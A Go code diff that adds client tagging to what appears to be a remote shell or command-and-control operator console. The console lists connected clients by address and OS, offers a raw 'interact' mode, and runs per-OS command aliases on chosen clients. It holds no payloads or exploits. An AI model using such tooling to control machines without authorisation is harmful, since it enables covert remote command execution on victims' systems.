@@ -25,6 +25,7 @@ var commands = map[string]CmdHandler{
 	"alias":    cmdAlias,
 	"run":      cmdRun,
 	"all":      cmdAll,
+	"tag":      cmdTag,
 }
 
 // Dispatch parses a line and routes it to the appropriate handler.
@@ -41,12 +42,12 @@ func (s *Server) Dispatch(line string) bool {
 		return handler(s, parts)
 	}
 
-	// Fallback: <id> <message>
+	// Fallback: <id|tag> <message>
 	split2 := strings.SplitN(line, " ", 2)
 	if len(split2) == 2 {
-		cid, err := strconv.Atoi(split2[0])
-		if err == nil {
-			if err := s.SendTo(cid, split2[1]); err != nil {
+		client := resolveClient(s, split2[0])
+		if client != nil {
+			if err := s.SendTo(client.ID, split2[1]); err != nil {
 				fmt.Printf("[!] %v\n", err)
 			}
 			return true
@@ -55,6 +56,23 @@ func (s *Server) Dispatch(line string) bool {
 
 	fmt.Println("[!] usage: <id> <message>   (try 'list')")
 	return true
+}
+
+// resolveClient finds a client by numeric ID or by tag name (case-insensitive).
+// Returns nil if no match is found.
+func resolveClient(s *Server, idOrTag string) *Client {
+	if cid, err := strconv.Atoi(idOrTag); err == nil {
+		return s.GetClient(cid)
+	}
+	lower := strings.ToLower(idOrTag)
+	s.mu.RLock()
+	defer s.mu.RUnlock()
+	for _, c := range s.clients {
+		if strings.ToLower(c.Tag) == lower {
+			return c
+		}
+	}
+	return nil
 }
 
 func cmdExit(s *Server, args []string) bool {
@@ -77,24 +95,23 @@ func cmdList(s *Server, args []string) bool {
 		if c.OS != "" {
 			osFlag = c.OS
 		}
-		fmt.Printf("    %d: %s  [%s]\n", c.ID, c.Addr, osFlag)
+		if c.Tag != "" {
+			fmt.Printf("    %d: %s  [%s]  (%s)\n", c.ID, c.Addr, osFlag, c.Tag)
+		} else {
+			fmt.Printf("    %d: %s  [%s]\n", c.ID, c.Addr, osFlag)
+		}
 	}
 	return true
 }
 
 func cmdKick(s *Server, args []string) bool {
 	if len(args) < 2 {
-		fmt.Println("[!] usage: kick <id>")
+		fmt.Println("[!] usage: kick <id|tag>")
 		return true
 	}
-	cid, err := strconv.Atoi(args[1])
-	if err != nil {
-		fmt.Println("[!] usage: kick <id>")
-		return true
-	}
-	client := s.GetClient(cid)
+	client := resolveClient(s, args[1])
 	if client == nil {
-		fmt.Printf("[!] no client with id %d\n", cid)
+		fmt.Printf("[!] no client %q\n", args[1])
 		return true
 	}
 	client.Conn.Close()
@@ -103,21 +120,16 @@ func cmdKick(s *Server, args []string) bool {
 
 func cmdInteract(s *Server, args []string) bool {
 	if len(args) < 2 {
-		fmt.Println("[!] usage: interact <id>")
+		fmt.Println("[!] usage: interact <id|tag>")
 		return true
 	}
-	cid, err := strconv.Atoi(args[1])
-	if err != nil {
-		fmt.Println("[!] usage: interact <id>")
-		return true
-	}
-	client := s.GetClient(cid)
+	client := resolveClient(s, args[1])
 	if client == nil {
-		fmt.Printf("[!] no client with id %d\n", cid)
+		fmt.Printf("[!] no client %q\n", args[1])
 		return true
 	}
-	s.SetInteractCID(int32(cid))
-	fmt.Printf("[*] interactive with client %d. '~.' or Ctrl-C to exit.\n", cid)
+	s.SetInteractCID(int32(client.ID))
+	fmt.Printf("[*] interactive with client %d. '~.' or Ctrl-C to exit.\n", client.ID)
 	return true
 }
 
@@ -138,22 +150,17 @@ func cmdOS(s *Server, args []string) bool {
 		return true
 	}
 	if len(args) == 3 && (args[2] == "windows" || args[2] == "linux") {
-		cid, err := strconv.Atoi(args[1])
-		if err != nil {
-			fmt.Println("[!] usage: os <id> <windows|linux>")
-			return true
-		}
-		client := s.GetClient(cid)
+		client := resolveClient(s, args[1])
 		if client == nil {
-			fmt.Printf("[!] no client with id %d\n", cid)
+			fmt.Printf("[!] no client %q\n", args[1])
 			return true
 		}
 		s.mu.Lock()
-		if c, ok := s.clients[cid]; ok {
+		if c, ok := s.clients[client.ID]; ok {
 			c.OS = args[2]
 		}
 		s.mu.Unlock()
-		fmt.Printf("[*] client %d flagged %s\n", cid, args[2])
+		fmt.Printf("[*] client %d flagged %s\n", client.ID, args[2])
 		return true
 	}
 	fmt.Println("[!] usage: os <id> <windows|linux>")
@@ -236,14 +243,15 @@ func cmdAlias(s *Server, args []string) bool {
 
 func cmdRun(s *Server, args []string) bool {
 	if len(args) < 3 {
-		fmt.Println("[!] usage: run <id> <alias> [arg0] [arg1] ...")
+		fmt.Println("[!] usage: run <id|tag> <alias> [arg0] [arg1] ...")
 		return true
 	}
-	cid, err := strconv.Atoi(args[1])
-	if err != nil {
-		fmt.Println("[!] usage: run <id> <alias> [arg0] [arg1] ...")
+	client := resolveClient(s, args[1])
+	if client == nil {
+		fmt.Printf("[!] no client %q\n", args[1])
 		return true
 	}
+	cid := client.ID
 	aliasName := args[2]
 	aliasArgs := args[3:]
 
@@ -253,12 +261,6 @@ func cmdRun(s *Server, args []string) bool {
 
 	if !exists {
 		fmt.Printf("[!] no alias '%s' (try 'alias')\n", aliasName)
-		return true
-	}
-
-	client := s.GetClient(cid)
-	if client == nil {
-		fmt.Printf("[!] no client with id %d\n", cid)
 		return true
 	}
 
@@ -293,6 +295,45 @@ func cmdRun(s *Server, args []string) bool {
 	return true
 }
 
+func cmdTag(s *Server, args []string) bool {
+	if len(args) == 1 {
+		clients := s.ListClients()
+		tagged := false
+		for _, c := range clients {
+			if c.Tag != "" {
+				fmt.Printf("    %d: %s\n", c.ID, c.Tag)
+				tagged = true
+			}
+		}
+		if !tagged {
+			fmt.Println("    (no tags set)")
+		}
+		return true
+	}
+	client := resolveClient(s, args[1])
+	if client == nil {
+		fmt.Printf("[!] no client %q\n", args[1])
+		return true
+	}
+	if len(args) == 2 {
+		s.mu.Lock()
+		if c, ok := s.clients[client.ID]; ok {
+			c.Tag = ""
+		}
+		s.mu.Unlock()
+		fmt.Printf("[*] client %d tag cleared\n", client.ID)
+		return true
+	}
+	tag := args[2]
+	s.mu.Lock()
+	if c, ok := s.clients[client.ID]; ok {
+		c.Tag = tag
+	}
+	s.mu.Unlock()
+	fmt.Printf("[*] client %d tagged as %q\n", client.ID, tag)
+	return true
+}
+
 func cmdAll(s *Server, args []string) bool {
 	if len(args) < 2 {
 		fmt.Println("[!] usage: all <message>")
@@ -310,15 +351,18 @@ func cmdAll(s *Server, args []string) bool {
 }
 
 const helpText = `  list / ls                         show connected clients
-  <id> <message>                    send message to client
+  <id|tag> <message>                send message to client
   all <message>                     broadcast to all clients
-  kick <id>                         disconnect client
-  interact <id> / i <id>            raw passthrough mode (Ctrl-C or ~. to exit)
+  kick <id|tag>                     disconnect client
+  interact <id|tag> / i <id|tag>    raw passthrough mode (Ctrl-C or ~. to exit)
   os                                list OS flags
-  os <id> <windows|linux>           set client OS flag
+  os <id|tag> <windows|linux>       set client OS flag
+  tag                               list tagged clients
+  tag <id|tag> <name>               set client tag
+  tag <id|tag>                      clear client tag
   alias                             list aliases
   alias add <name> <win> ::: <lin>  define alias
   alias del <name>                  remove alias
-  run <id> <name> [arg0] [arg1] ... run alias on client ({0}/{1} substituted)
+  run <id|tag> <name> [args]        run alias on client ({0}/{1} substituted)
   exit / quit                       shut down server
 `
